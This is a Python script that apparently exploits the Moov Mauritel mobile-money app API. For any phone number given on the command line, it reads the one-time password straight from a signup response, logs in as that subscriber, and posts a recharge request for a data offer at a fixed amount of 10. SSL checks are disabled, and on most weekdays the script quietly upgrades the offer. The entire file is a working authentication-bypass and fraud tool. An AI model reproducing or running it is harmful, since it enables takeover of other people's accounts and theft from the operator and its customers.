import requests
import urllib3
import sys
import json


# تعطيل تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

phone_number = sys.argv[1]
offer = sys.argv[2].upper()
original_offer = offer  # حفظ العرض الأصلي

from datetime import datetime

# توقيت موريتانيا (UTC)
today = datetime.utcnow().weekday()

# العرض الذي سيتم إرساله فقط
send_offer = offer

if today not in (4, 5, 6):
    upgrade = {
        "A": "B",
        "B": "C",
        "C": "D",
        "D": "E"
    }
    send_offer = upgrade[offer]
offers = {
    "A": {
        "idOffre": 49,
        "half_price": 50
    },
    "B": {
        "idOffre": 50,
        "half_price": 100
    },
    "C": {
        "idOffre": 51,
        "half_price": 150
    },
    "D": {
        "idOffre": 52,
        "half_price": 250
    },
    "E": {
        "idOffre": 53,
        "half_price": 250
    }
}

if offer not in offers:
    raise ValueError("العرض غير صحيح")

id_offre = offers[send_offer]["idOffre"]      # العرض المرسل
half_price = offers[original_offer]["half_price"]  # السعر الأصلي
# ==========================
# المرحلة الأولى: التسجيل
# ==========================

signup_url = "http://ec2-18-210-103-52.compute-1.amazonaws.com/mymoovbemobile/auth/signupByPhone"




headers = {
    "User-Agent": "Dart/3.5 (dart:io)",
    "Accept": "application/json; charset=UTF-8",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json",
    "lang": "fr",
    "mmauth": ""
}

signup_payload = {
    "phone": phone_number
}

signup_response = requests.post(
    signup_url,
    json=signup_payload,
    headers=headers
)

#print("استجابة التسجيل:", signup_response.text)

otp = signup_response.text.strip()

# ==========================
# المرحلة الثانية: تسجيل الدخول
# ==========================

signin_url = "http://ec2-18-210-103-52.compute-1.amazonaws.com/mymoovbemobile/auth/signInByPhone"

signin_payload = {
    "phoneNo": phone_number,
    "otp": otp
}

signin_response = requests.post(
    signin_url,
    json=signin_payload,
    headers=headers
)

try:
    token = signin_response.json().get("token")
except Exception:
    raise Exception("فشل استخراج الـ Token")

# ==========================
# المرحلة الثالثة: طلب العرض
# ==========================

recharge_url = "https://mymoov.moov-mauritel.mr/mainApp/moov-money/recharge"

recharge_headers = {
    "User-Agent": "Dart/3.9 (dart:io)",
    "lang": "fr",
    "mmauth": token,
    "Accept": "application/json; charset=UTF-8",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=UTF-8",
}

recharge_data = {
    "amount": 10,
    "idOffre": id_offre
}

response = requests.post(
    recharge_url,
    headers=recharge_headers,
    json=recharge_data,
    verify=False,
    timeout=30
)

try:
    result = response.json()

    if result.get("seccess") is True:
        print(json.dumps({
            "status": "success"
        }))
    else:
        print(json.dumps({
            "status": "fail",
            "response": result
        }))

except Exception:
    print(json.dumps({
        "status": "fail",
        "response": response.text
    }))
